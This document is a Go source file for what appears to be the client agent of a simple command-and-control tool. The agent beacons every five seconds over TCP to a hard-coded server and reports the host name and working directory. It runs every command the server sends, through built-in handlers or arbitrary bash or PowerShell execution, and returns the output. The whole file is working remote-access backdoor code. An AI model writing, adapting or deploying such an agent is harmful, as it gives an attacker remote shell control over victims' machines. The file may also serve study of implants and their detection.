package main

import (
	"crypto/md5"
	"encoding/gob"
	"encoding/hex"
	"fmt"
	"global"
	"helpers"
	"log"
	"net"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"time"

	"github.com/mitchellh/go-ps"
)

var (
	message   = global.Message{}
	heartBeat = 5
)

const (
	SERVER = "127.0.0.1"
	PORT   = "9090"
)

func init() {
	message.AgentHostname, _ = os.Hostname()
	message.AgentCWD, _ = os.Getwd()
	message.AgentID = generateID()
}

func main() {
	log.Println("Execution started")

	for {
		channel := connectionServer()

		defer channel.Close()

		//Sending message to server
		gob.NewEncoder(channel).Encode(message)
		message.Commands = []global.Command{}

		//Receiving message from server
		gob.NewDecoder(channel).Decode(&message)

		if messageContainsCommand(message) {
			for i, v := range message.Commands {
				message.Commands[i].Response = execCommand(v.Request)
			}
		}

		time.Sleep(time.Duration(heartBeat) * time.Second)
	}
}

func execCommand(command string) (response string) {

	separateCommand := helpers.CommandsSplit(command)
	baseCommando := separateCommand[0]

	switch baseCommando {
	case "ls":
		response = listFiles()
	case "pwd":
		response = listCurrentDirectory()
	case "cd":
		if len(separateCommand[1]) > 0 {
			response = changeDirectory(separateCommand[1])
		}
	case "whoami":
		response = whoami()
	case "ps":
		response = processList()
	default:
		response = shellExecution(command)
	}

	return response
}

// Commands implementations
func listFiles() (resp string) {
	files, _ := os.ReadDir(listCurrentDirectory())

	for _, v := range files {
		resp += v.Name() + "\n"
	}
	return "\n" + resp
}

func listCurrentDirectory() (currentDir string) {
	currentDir, _ = os.Getwd()
	return currentDir
}

func changeDirectory(directory string) (resp string) {
	resp = "Current directory change success!"
	err := os.Chdir(directory)

	if err != nil {
		resp = "Directory change error: " + err.Error()
	}

	return resp
}

func whoami() (resp string) {
	user, _ := user.Current()
	resp = user.Username
	return resp
}

func processList() (resp string) {
	process, _ := ps.Processes()
	for _, v := range process {
		resp += fmt.Sprintf("%d -> %d -> %s \n", v.PPid(), v.Pid(), v.Executable())
	}
	return resp
}

func shellExecution(command string) (resp string) {

	if runtime.GOOS == "windows" {
		output, _ := exec.Command("powershell.exe", "/C", command).CombinedOutput()
		resp = string(output)
	} else if runtime.GOOS == "linux" {
		output, _ := exec.Command("bash", "-c", command).Output()
		resp = string(output)
	} else {
		resp = "System not implemented"
	}

	return resp
}

///////

func messageContainsCommand(serverMessage global.Message) (contains bool) {
	contains = false
	if len(serverMessage.Commands) > 0 {
		contains = true
	}
	return contains
}

func generateID() string {
	time := time.Now().String()

	hash := md5.New()

	hash.Write([]byte(message.AgentHostname + time))

	return hex.EncodeToString(hash.Sum(nil))
}

func connectionServer() (channel net.Conn) {
	channel, _ = net.Dial("tcp", SERVER+":"+PORT)
	return channel
}
